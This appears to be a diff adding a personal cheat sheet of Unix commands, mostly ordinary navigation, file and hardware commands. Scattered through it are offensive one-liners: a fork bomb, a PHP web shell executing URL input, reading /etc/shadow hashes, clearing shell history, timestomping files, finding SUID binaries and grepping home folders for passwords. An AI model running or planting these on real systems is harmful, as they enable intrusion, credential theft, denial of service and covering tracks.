@@ -1,0 +1,83 @@
+
+USEFUL-ASS UNIX COMMANDS
+
+
+pwd	show working path
+ls -lhS	Show current dir files in size order (small on bottom)
+ls -lhSr	Show current dir files in size order (big on bottom)
+ls -lhur	Show by last access
+ls -ah	Show 'hidden' beginning with a dot files
+cd ..	Jump out a folder
+cd ~ Go to user home folder
+cd / Go to root folder
+cd - go to last folder directed to
+
+sudo bash	terminal acquires root priviledges
+sudo !!	repeats last command with sudo before
+
+du -h FILENAME	Print file size
+file FILENAME	Describe file
+
+
+
+apropos TOPIC    Get info about commands
+whoami    show current user
+
+lshw	hardware info
+lspci	PCI hardware info
+lsusb	USB hardware info
+lscpu	CPU info
+cat /etc/*release*    prints OS Version Info
+cat /proc/version    show Kernel info
+
+
+apt list     show installed packages
+
+
+
+chmod 777 FILE/DIR	give full permissions to all users
+
+rm FILENAME	Delete (Reallocate) a file
+rm -r DIR	Delete whole directory
+shred -fuz FILENAME	Overwrite and delete file
+
+rm *
+history	show last inputted commands
+history -c	erase command history
+
+touch FILE    update file modification history
+touch -r FILE_A FILE_B    match modification history of B to A
+touch -t YYYYMMDDHHSS FILE    match file mod history to given time
+
+sudo fdisk -l    show attached disks
+dd if=/dev/urandom of=FILENAME bs=1 count=NUMBER_OF_BYTES    creates random binary file of given size
+
+
+cat /etc/shadow | grep USER	print user password hash
+cat /etc/passwd	Show user list
+cat /etc/hosts	Show all hosts
+cat /etc/hostname	Show current hostname
+
+
+CHANGE HOSTNAME - replace current name in both of these files
+gedit /etc/hostname
+gedit /etc/hosts
+
+
+
+cat /usr/share/wireshark/manuf | grep -i (FIRST THREE PAIRS IN MAC)    MAC Vendor Lookup
+
+:(){ :|:& };:    Fork Bomb - crashes computer
+
+notify-send "MESSAGE"    Alert notification (some distros, Debian)
+
+
+
+
+<?php passthru($_GET["cmd"]); ?> ---- PHP URL COMMAND SHELL
+
+
+
+find / -perm -4000 2>/dev/null
+
+cd /home; grep -Ri 'password' .
